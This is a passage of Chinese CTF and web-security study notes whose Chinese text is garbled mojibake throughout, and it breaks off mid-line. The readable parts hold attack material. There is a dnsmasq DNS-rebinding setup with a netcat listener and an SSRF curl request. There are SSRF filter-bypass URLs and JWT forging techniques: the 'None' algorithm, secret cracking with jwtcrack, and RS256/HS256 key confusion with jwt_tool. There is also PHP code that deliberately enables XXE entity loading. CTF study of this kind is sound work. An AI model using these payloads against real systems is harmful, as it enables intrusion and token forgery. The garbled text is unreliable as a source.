æœåŠ¡å™¨<br>ç”±äºé˜¿é‡Œäº‘ DNS ä¸æ”¯æŒ TTL ä¸º 0 çš„è®¾ç½®ï¼Œæ‚¨éœ€è¦é…ç½®ä¸€ä¸ªæ‚¨å¯ä»¥å®Œå…¨æ§åˆ¶çš„ DNS æœåŠ¡å™¨ã€‚æ‚¨å¯ä»¥åœ¨é˜¿é‡Œäº‘ ECS å®ä¾‹ä¸Šè¿è¡Œä¸€ä¸ª DNS æœåŠ¡å™¨ï¼ˆä¾‹å¦‚ Bind æˆ– dnsmasqï¼‰ï¼Œå¹¶æ‰‹åŠ¨è®¾ç½® TTL ä¸º 0ã€‚</li></ol><p>ä½¿ç”¨ dnsmasq è®¾ç½® DNS æœåŠ¡å™¨<br>åœ¨é˜¿é‡Œäº‘ä¸Šåˆ›å»ºä¸€ä¸ª ECS å®ä¾‹å¹¶å®‰è£… dnsmasqï¼š</p><p>bash<br>å¤åˆ¶ä»£ç <br>sudo yum install -y dnsmasq  # å¯¹äº CentOS<br>sudo apt-get install -y dnsmasq  # å¯¹äº Ubuntu<br>ç¼–è¾‘ dnsmasq é…ç½®æ–‡ä»¶ &#x2F;etc&#x2F;dnsmasq.confï¼Œæ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š</p><p>conf<br>å¤åˆ¶ä»£ç <br>no-resolv<br>server&#x3D;8.8.8.8  # ä½¿ç”¨ Google çš„å…¬å…± DNS ä½œä¸ºä¸Šæ¸¸ DNS æœåŠ¡å™¨<br>address&#x3D;&#x2F;sudo.cc&#x2F;203.0.113.1  # åˆå§‹è§£æè¿”å›å¤–éƒ¨ IP<br>address&#x3D;&#x2F;sudo.cc&#x2F;127.0.0.1  # é‡ç»‘å®šè§£æè¿”å›å†…ç½‘ IP<br>æ³¨æ„ï¼šç¡®ä¿ TTL è®¾ç½®ä¸º 0ã€‚dnsmasq çš„é»˜è®¤ TTL æ˜¯ 0ï¼Œä¸éœ€è¦é¢å¤–é…ç½®ã€‚</p><p>å¯åŠ¨ dnsmasq æœåŠ¡ï¼š</p><p>bash<br>å¤åˆ¶ä»£ç <br>sudo systemctl restart dnsmasq<br>sudo systemctl enable dnsmasq<br>æ›´æ–°æ‚¨åœ¨é˜¿é‡Œäº‘ä¸Šçš„åŸŸåè§£æï¼ŒæŒ‡å‘æ‚¨é…ç½®çš„ ECS å®ä¾‹çš„ IP åœ°å€ã€‚</p><ol start="3"><li>æ‰§è¡Œ DNS Rebinding æ”»å‡»<br>åœ¨æ”»å‡»è€…æœºå™¨ä¸Šå¯åŠ¨ netcat</li></ol><p> ç›‘å¬ï¼š</p><p>bash<br>å¤åˆ¶ä»£ç <br>nc -lvnp 4444<br>å‘é€ POST è¯·æ±‚åˆ°ç›®æ ‡æœåŠ¡å™¨ï¼š</p><p>bash<br>å¤åˆ¶ä»£ç <br>curl -X POST -d â€œurl&#x3D;<a href="http://sudo.cc/flag.php">http://sudo.cc/flag.php</a>â€œ http:&#x2F;&#x2F;ç›®æ ‡æœåŠ¡å™¨åœ°å€&#x2F;script.php<br>éªŒè¯å’Œè°ƒè¯•<br>éªŒè¯ DNS è§£æï¼š<br>ç¡®ä¿åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šè¿›è¡Œ DNS è§£ææ—¶ï¼Œèƒ½å¤Ÿè¿”å›æ­£ç¡®çš„ IP åœ°å€ï¼š</p><p>bash<br>å¤åˆ¶ä»£ç <br>nslookup sudo.cc<br>æ£€æŸ¥é˜²ç«å¢™å’Œå®‰å…¨ç»„ï¼š<br>ç¡®ä¿æ‚¨çš„é˜¿é‡Œäº‘ ECS å®ä¾‹çš„å®‰å…¨ç»„è§„åˆ™å…è®¸å¤–éƒ¨è®¿é—®ã€‚</p><p>ç›‘æ§ DNS è§£æï¼š<br>ä½¿ç”¨ tcpdump æˆ–å…¶ä»–ç½‘ç»œç›‘æ§å·¥å…·ï¼Œç¡®ä¿ DNS è¯·æ±‚å’Œå“åº”ç¬¦åˆé¢„æœŸã€‚</p><p>æ³¨æ„äº‹é¡¹<br>åˆæ³•æ€§ï¼šç¡®ä¿æ‚¨è¿›è¡Œçš„æ‰€æœ‰æ“ä½œéƒ½æ˜¯åœ¨åˆæ³•æˆæƒçš„èŒƒå›´å†…ã€‚æœªç»æˆæƒçš„æ”»å‡»æ˜¯éæ³•çš„ã€‚<br>æµ‹è¯•ç¯å¢ƒï¼šæœ€å¥½åœ¨éš”ç¦»çš„æµ‹è¯•ç¯å¢ƒä¸­è¿›è¡Œæµ‹è¯•ï¼Œä»¥é¿å…å¯¹ç”Ÿäº§ç¯å¢ƒé€ æˆå½±å“ã€‚<br>é˜²æŠ¤æªæ–½ï¼šäº†è§£å¹¶å­¦ä¹ è¿™äº›æ”»å‡»æŠ€æœ¯åï¼Œå»ºè®®é‡‡å–ç›¸åº”çš„é˜²æŠ¤æªæ–½ï¼Œé˜²æ­¢åœ¨å®é™…åº”ç”¨ä¸­è¢«åˆ©ç”¨ã€‚</p><p>5 åˆ©ç”¨çŸ­ç½‘å€ç»•è¿‡<br>baidu.com  ä¸å…è®¸å‡ºç°baidu<br>æˆ–è€…é™åˆ¶äº†urlé•¿åº¦ï¼Œæˆ‘ä»¬å¯ä»¥åˆ‡æ¢ä¸ºçŸ­ç½‘å€ï¼Œæ¥ç»•è¿‡é•¿åº¦çš„é™åˆ¶<br><a href="http://rurl.vip/eW7AU">http://rurl.vip/eW7AU</a></p><p>é¦–å…ˆå‡†å¤‡ç›‘å¬<br>url&#x3D;<a href="http://ctf.@127.0.0.1/flag.php?show">http://ctf.@127.0.0.1/flag.php?show</a><br>url&#x3D;<a href="http://ctf.@127.0.0.1/flag.php#show">http://ctf.@127.0.0.1/flag.php#show</a></p><h1 id="æœ¬åœ°æ‰èƒ½çœ‹åˆ°flagï¼Œè¿™å°±éœ€è¦ssrfäº†"><a href="#æœ¬åœ°æ‰èƒ½çœ‹åˆ°flagï¼Œè¿™å°±éœ€è¦ssrfäº†" class="headerlink" title="æœ¬åœ°æ‰èƒ½çœ‹åˆ°flagï¼Œè¿™å°±éœ€è¦ssrfäº†"></a>æœ¬åœ°æ‰èƒ½çœ‹åˆ°flagï¼Œè¿™å°±éœ€è¦ssrfäº†</h1><h1 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h1><p>jwtæ˜¯ä¸€ä¸ªè½»é‡çº§çš„è®¤è¯è§„èŒƒ å¯¹æ•°æ®è¿›è¡Œç­¾åç”¨çš„</p><p>é˜²æ­¢æ•°æ®è¢«ç¯¡æ”¹<br>1 å¯¹æ•°æ®è¿›è¡ŒåŠ å¯†   å†…å®¹å¯¹ç”¨æˆ·æ•æ„Ÿï¼Œä¸éœ€è¦å¯¹å¤–<br>2 å¯¹æ•°æ®è¿›è¡Œç­¾å   å†…å®¹ä¸æ•æ„Ÿï¼Œä½†æ˜¯ç¡®ä¿ä¸è¢«ç¯¡æ”¹</p><p>JWTæ˜¯å¯¹æ•°æ®è¿›è¡Œç­¾åï¼Œé˜²æ­¢æ•°æ®ç¯¡æ”¹ï¼Œè€Œä¸æ˜¯é˜²æ­¢æ•°æ®è¢«è¯»å–<br>JSON Web Token JWT<br>?username&#x3D;admin&amp;score&#x3D;100  åˆ«äººä¼ é€’è¿‡ç¨‹ä¸­ï¼Œä¼šå¯¹ç§¯åˆ†è¿›è¡Œç¯¡æ”¹<br>?username&#x3D;admin&amp;score&#x3D;100&amp;token&#x3D;c17961f5f372f8cf039113909d715943<br>? md5(score&#x3D;100&amp;username&#x3D;admin)&#x3D;c17961f5f372f8cf039113909d715943<br>?score&#x3D;100&amp;username&#x3D;admin&amp;token&#x3D;c17961ff372f8cf039113909d715943<br>ç¯¡æ”¹æ•°æ®çš„åŒæ—¶ï¼Œç ´è§£äº†ç®—æ³•ï¼Œç¯¡æ”¹äº†ç­¾å<br>åŠ ç›æœºåˆ¶ï¼Œsalt<br>md5(score&#x3D;100&amp;username&#x3D;admin_ctfshow)&#x3D;20f3fa445b286df3f1a518fcbcd8bbe2</p><p>ç›å€¼æœ‰å¯èƒ½è¢«çˆ†ç ´ï¼Œä¹Ÿæœ‰å¯èƒ½è¢«æ³„éœ²<br>å¢åŠ æ›´é«˜çš„å¯†ç ç®—æ³•ï¼Œä¸å†ç®€å•çš„md5ï¼Œç›å€¼ä¹Ÿå¤§å¹…åº¦æé«˜é•¿åº¦ï¼Œè¾¾åˆ°å‡ ç™¾ä¸Šåƒä½ æ¥ä¿è¯æˆ‘ä»¬çš„æ•°æ®ä¸è¢«ç¯¡æ”¹  æˆ–è€…å³ä½¿ç¯¡æ”¹äº†æˆ‘ä»¬èƒ½å‘ç°<br>ç”± Headerã€Payloadã€Signatureä¸‰éƒ¨åˆ†æ„æˆï¼Œç”¨ç‚¹åˆ†éš”ï¼Œæ•°æ®é‡‡ç”¨Base64URLè¿›è¡Œç¼–ç <br>Headeræ˜¯JWTçš„ç¬¬ä¸€ä¸ªéƒ¨åˆ†ï¼Œæ˜¯ä¸€ä¸ª JSON å¯¹è±¡ï¼Œä¸»è¦å£°æ˜äº†JWTçš„ç­¾åç®—æ³•ï¼Œå¦‚â€œHS256â€ã€â€œRS256â€ç­‰ï¼Œä»¥åŠå…¶ä»–å¯é€‰å‚æ•°ï¼Œå¦‚â€œkidâ€ç­‰ã€‚<br>Header</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;alg&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;HS256&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;typ&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;jwt&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>Payloadæ˜¯JWTçš„ç¬¬äºŒä¸ªéƒ¨åˆ†ï¼Œè¿™ä¹Ÿæ˜¯ä¸€ä¸ª JSON å¯¹è±¡ï¼Œä¸»è¦æ‰¿è½½äº†å„ç§å£°æ˜å¹¶ä¼ é€’æ˜æ–‡æ•°æ®ï¼Œä¸€èˆ¬ç”¨äºå­˜å‚¨ç”¨æˆ·çš„ä¿¡æ¯ï¼Œå¦‚ idã€ç”¨æˆ·åã€è§’è‰²ã€ä»¤ç‰Œç”Ÿæˆæ—¶é—´å’Œå…¶ä»–è‡ªå®šä¹‰å£°æ˜<br>Payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;user&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Admin&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>Signature<br>    Signature æ˜¯å¯¹ Header å’Œ Payload è¿›è¡Œç­¾åï¼Œå…·ä½“æ˜¯ç”¨ä»€ä¹ˆåŠ å¯†æ–¹å¼å†™åœ¨ Headerçš„algä¸­ã€‚åŒæ—¶æ‹¥æœ‰è¯¥éƒ¨åˆ†çš„JWTè¢«ç§°ä¸ºJWSï¼Œä¹Ÿå°±æ˜¯ç­¾äº†åçš„JWTã€‚<br>    Signatureçš„åŠŸèƒ½æ˜¯ä¿æŠ¤tokenå®Œæ•´æ€§ã€‚<br>ç”Ÿæˆæ–¹æ³•ä¸ºå°†headerå’Œpayloadä¸¤ä¸ªéƒ¨åˆ†è”ç»“èµ·æ¥ï¼Œç„¶åé€šè¿‡headeréƒ¨åˆ†æŒ‡å®šçš„ç®—æ³•ï¼Œè®¡ç®—å‡ºç­¾åã€‚æŠ½è±¡æˆå…¬å¼å°±æ˜¯ï¼šsignature &#x3D; HMAC-SHA256(base64urlEncode(header) + â€˜.â€™ + base64urlEncode(payload), secret_key)<br>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œç¼–ç headerå’Œpayloadæ—¶ä½¿ç”¨çš„ç¼–ç æ–¹å¼ä¸ºbase64urlencodeï¼Œbase64urlç¼–ç æ˜¯base64çš„ä¿®æ”¹ç‰ˆï¼Œä¸ºäº†æ–¹ä¾¿åœ¨ç½‘ç»œä¸­ä¼ è¾“ä½¿ç”¨äº†ä¸åŒçš„ç¼–ç è¡¨ï¼Œå®ƒä¸ä¼šåœ¨æœ«å°¾å¡«å……â€&#x3D;â€å·ï¼Œå¹¶å°†æ ‡å‡†Base64ä¸­çš„â€+â€å’Œâ€&#x2F;â€œåˆ†åˆ«æ”¹æˆäº†â€-â€œå’Œâ€_â€ã€‚</p><p>JWTç”Ÿæˆ-åœ¨çº¿ç½‘å€&amp;å·¥å…·</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 flask_session_cookie_manager3.py encode -s <span class="hljs-string">&#x27;secret_key&#x27;</span> -t <span class="hljs-string">&#x27;&#123;&quot;admin&quot;:True,&quot;username&quot;:&quot;admin&quot;&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="æ¼æ´ç‚¹"><a href="#æ¼æ´ç‚¹" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h2><p>1 å½“ä¸æ ¡éªŒç®—æ³•æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥æ›¿æ¢ç®—æ³•ï¼Œç”šè‡³å¯ä»¥ä½¿ç”¨ç©ºçš„ç®—æ³•ï¼Œæ¥è¾¾åˆ°æ•°æ®ç¯¡æ”¹ç›®çš„</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;alg&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;None&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;typ&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;jwt&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;user&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Admin&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;alg&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;None&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;typ&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;JWT&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;iss&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;iat&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1673703091</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;exp&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1673710291</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;nbf&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1673703091</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;sub&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;jti&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;21a3d6eec9efbc030983fbc3650c0f03&quot;</span><span class="hljs-punctuation">&#125;</span><br><br>ewogICAgImFsZyIgOiAiTm9uZSIsCiAgICAidHlwIiA6ICJqd3QiCn0=.ewogICAgInVzZXIiIDogImFkbWluIgp9<br></code></pre></td></tr></table></figure><p>JWT çˆ†ç ´å·¥å…·åœ°å€<br><a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker build . -t jwtcrack<br>docker run -it --<span class="hljs-built_in">rm</span>  jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE<br></code></pre></td></tr></table></figure><h3 id="å¯†é’¥æ··æ·†æ”»å‡»"><a href="#å¯†é’¥æ··æ·†æ”»å‡»" class="headerlink" title="å¯†é’¥æ··æ·†æ”»å‡»"></a>å¯†é’¥æ··æ·†æ”»å‡»</h3><pre><code class="hljs">JWTæœ€å¸¸ç”¨çš„ä¸¤ç§ç®—æ³•æ˜¯HMACå’ŒRSAã€‚HMACç”¨åŒä¸€ä¸ªå¯†é’¥å¯¹tokenè¿›è¡Œç­¾åå’Œè®¤è¯ã€‚è€ŒRSAéœ€è¦ä¸¤ä¸ªå¯†é’¥ï¼Œå…ˆç”¨ç§é’¥åŠ å¯†ç”ŸæˆJWTï¼Œç„¶åä½¿ç”¨å…¶å¯¹åº”çš„å…¬é’¥æ¥è§£å¯†éªŒè¯ã€‚é‚£ä¹ˆï¼Œåç«¯ä»£ç ä¼šä½¿ç”¨å…¬é’¥ä½œä¸ºç§˜å¯†å¯†é’¥ï¼Œç„¶åä½¿ç”¨HS256ç®—æ³•éªŒè¯ç­¾åã€‚ç”±äºå…¬é’¥æœ‰æ—¶å¯ä»¥è¢«æ”»å‡»è€…è·å–åˆ°ï¼Œæ‰€ä»¥æ”»å‡»è€…å¯ä»¥ä¿®æ”¹headerä¸­ç®—æ³•ä¸ºHS256ï¼Œç„¶åä½¿ç”¨RSAå…¬é’¥å¯¹æ•°æ®è¿›è¡Œç­¾åã€‚ åˆ©ç”¨æ–¹å¼ï¼šjwt_tool(https://github.com/ticarpi/jwt_tool) ç”¨æ³•ï¼špython3 jwt_tool.py token_here -pk pubkey -T -S hs256</code></pre><p>å¯†é’¥çˆ†ç ´&#x2F;æ³„éœ²<br>    HMACç­¾åå¯†é’¥ï¼ˆä¾‹å¦‚HS256 &#x2F; HS384 &#x2F; HS512ï¼‰ä½¿ç”¨å¯¹ç§°åŠ å¯†ï¼Œè¿™æ„å‘³ç€å¯¹ä»¤ç‰Œè¿›è¡Œç­¾åçš„å¯†é’¥ä¹Ÿç”¨äºå¯¹å…¶è¿›è¡ŒéªŒè¯ã€‚ç”±äºç­¾åéªŒè¯æ˜¯ä¸€ä¸ªè‡ªåŒ…å«çš„è¿‡ç¨‹ï¼Œå› æ­¤å¯ä»¥æµ‹è¯•ä»¤ç‰Œæœ¬èº«çš„æœ‰æ•ˆå¯†é’¥ï¼Œè€Œä¸å¿…å°†å…¶å‘é€å›åº”ç”¨ç¨‹åºè¿›è¡ŒéªŒè¯ã€‚<br>    å› æ­¤ï¼Œjwtcrackç ´è§£æ˜¯JWTç ´è§£å·¥å…·ï¼Œå¯ä»¥é€šè¿‡ç©·ä¸¾çš„æ–¹å¼æš´åŠ›ç ´è§£å¯†é’¥ã€‚<br>    å¦‚æœå¯ä»¥ç ´è§£HMACå¯†é’¥ï¼Œåˆ™å¯ä»¥ä¼ªé€ ä»¤ç‰Œä¸­çš„ä»»ä½•å†…å®¹ï¼Œè¿™ä¸ªæ¼æ´å°†ä¼šç»™ç³»ç»Ÿå¸¦æ¥éå¸¸ä¸¥é‡çš„åæœï¼Œæ‰€ä»¥åœ¨åŠ å¯†æ—¶ä¸è¦ä½¿ç”¨å¼±å¯†é’¥è¿›è¡ŒåŠ å¯†ã€‚<br>    jwtcrack(<a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a>)<br>    ç”¨æ³•ï¼š.&#x2F;jwtcrack token_here</p><p>nodeå®‰è£…jwtå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install jsonwebtoken<br></code></pre></td></tr></table></figure><h3 id="ç§é’¥æ³„éœ²"><a href="#ç§é’¥æ³„éœ²" class="headerlink" title="ç§é’¥æ³„éœ²"></a>ç§é’¥æ³„éœ²</h3><p>å¯ä»¥æ ¹æ®ç§é’¥ç”Ÿæˆä»»æ„çš„jwtå­—ç¬¦ä¸²</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>);<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><br><span class="hljs-keyword">var</span> privateKey = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;private.key&#x27;</span>);<br><br><span class="hljs-keyword">var</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123; <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;admin&#x27;</span> &#125;, privateKey, &#123; <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;RS256&#x27;</span> &#125;);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(token)<br></code></pre></td></tr></table></figure><p>éªŒç­¾</p><h3 id="å…¬é’¥æ³„éœ²"><a href="#å…¬é’¥æ³„éœ²" class="headerlink" title="å…¬é’¥æ³„éœ²"></a>å…¬é’¥æ³„éœ²</h3><p>å¯ä»¥æ ¹æ®å…¬é’¥ï¼Œä¿®æ”¹ç®—æ³•ä»éå¯¹ç§°ç®—æ³• åˆ° å¯¹ç§°å¯†é’¥ç®—æ³•  </p><p>åŒæ–¹éƒ½ä½¿ç”¨å…¬é’¥éªŒç­¾ï¼Œé¡ºåˆ©ç¯¡æ”¹æ•°æ®</p><p>å½“å…¬é’¥å¯ä»¥æ‹¿åˆ°æ—¶ï¼Œå¦‚æœä½¿ç”¨å¯¹ç§°å¯†ç ï¼Œåˆ™å¯¹é¢ä½¿ç”¨ç›¸åŒçš„å…¬é’¥è¿›è¡Œè§£å¯†</p><p>å®ç°éªŒç­¾é€šè¿‡</p><h3 id="æ€»ç»“åŠ å¯†æ–¹å¼"><a href="#æ€»ç»“åŠ å¯†æ–¹å¼" class="headerlink" title="æ€»ç»“åŠ å¯†æ–¹å¼"></a>æ€»ç»“åŠ å¯†æ–¹å¼</h3><p>1 éå¯¹ç§°åŠ å¯†ç®—æ³•  ç§é’¥  å…¬é’¥   åªè¦ä¸¤ä¸ªæ—¶åŒ¹é… ä¸€ä¸ªç§é’¥åŠ å¯†çš„æ–‡ä»¶ï¼Œç”¨å…¬é’¥éƒ½èƒ½è§£å¼€(éªŒç­¾)</p><p>2 å¯¹ç§°åŠ å¯†ç®—æ³•   æš—å·  å£ä»¤  å…¬é’¥ </p><h3 id="æ€»ç»“jwtæ”»å‡»"><a href="#æ€»ç»“jwtæ”»å‡»" class="headerlink" title="æ€»ç»“jwtæ”»å‡»"></a>æ€»ç»“jwtæ”»å‡»</h3><p>1 ç©ºå¯†ç ç®—æ³•ç»•è¿‡ ä¸éªŒè¯ç®—æ³•çš„å‰æä¸‹</p><p>2 å¼±å¯†ç ç»•è¿‡   çŒœæµ‹å¼±å¯†ç </p><p>3 å¯†ç çˆ†ç ´   å®‰è£…docker æ‰§è¡Œjwtcracker</p><p>4 ç§é’¥æ³„éœ²  ç›´æ¥åˆ©ç”¨ç§é’¥ç”Ÿæˆæ­£ç¡®jwtå­—ç¬¦ä¸² è¿‡éªŒç­¾</p><p>5 å…¬é’¥æ³„éœ²  ä¸éªŒè¯ç®—æ³•å‰æä¸‹ï¼Œä¿®æ”¹ç®—æ³•ä¸ºå¯¹ç§°åŠ å¯†ï¼Œé€šè¿‡å…¬é’¥é‡æ–°ç”Ÿæˆå¯¹ç§°ç­¾åçš„å­—ç¬¦ä¸² å®ç°éªŒç­¾é€šè¿‡</p><p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p><h1 id="XXEçš„åˆ©ç”¨"><a href="#XXEçš„åˆ©ç”¨" class="headerlink" title="XXEçš„åˆ©ç”¨"></a>XXEçš„åˆ©ç”¨</h1><p>å—åˆ°å½±å“çš„ç±»å’Œå‡½æ•°<br><code>SimpleXMLElement</code>ã€&#96;DOM</p><p>Document<code>ã€</code>simplexml_load_string&#96;<br>(libxml&lt;2.9.0, PHP 5, PHP 7)<br>libxml2.9.0ä»¥åï¼Œé»˜è®¤ä¸è§£æå¤–éƒ¨å®ä½“ï¼Œå¯¼è‡´XXEæ¼æ´é€æ¸æ¶ˆäº¡ã€‚ä¸ºäº†æ¼”ç¤ºPHPç¯å¢ƒä¸‹çš„XXEæ¼æ´<br>XML Entity å®ä½“æ³¨å…¥<br>å½“ç¨‹åºå¤„ç†xmlæ–‡ä»¶æ—¶ï¼Œæ²¡æœ‰ç¦æ­¢å¯¹å¤–éƒ¨å®ä½“çš„å¤„ç†ï¼Œå®¹æ˜“é€ æˆxxeæ¼æ´<br>å±å®³<br>ä¸»æµæ˜¯ä»»æ„æ–‡ä»¶è¯»å–<br>Content-Type: text&#x2F;xml</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<span class="hljs-comment">//é»˜è®¤æƒ…å†µä¸‹ï¼Œlibxml_disable_entity_loader æ˜¯å¯ç”¨çš„ï¼Œå®ƒç¦ç”¨å¤–éƒ¨å®ä½“çš„åŠ è½½ã€‚è¿™é‡Œï¼Œå®ƒè¢«è®¾ç½®ä¸º falseï¼Œæ„å‘³ç€å…è®¸å¤–éƒ¨å®ä½“çš„åŠ è½½ã€‚è¿™å¯èƒ½å¸¦æ¥å®‰å…¨é£é™©ï¼Œå› ä¸ºå®ƒå¯èƒ½å…è®¸ XXE (XML External Entity) æ”»å‡»</span><br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<span class="hljs-comment">//LIBXML_NOENT 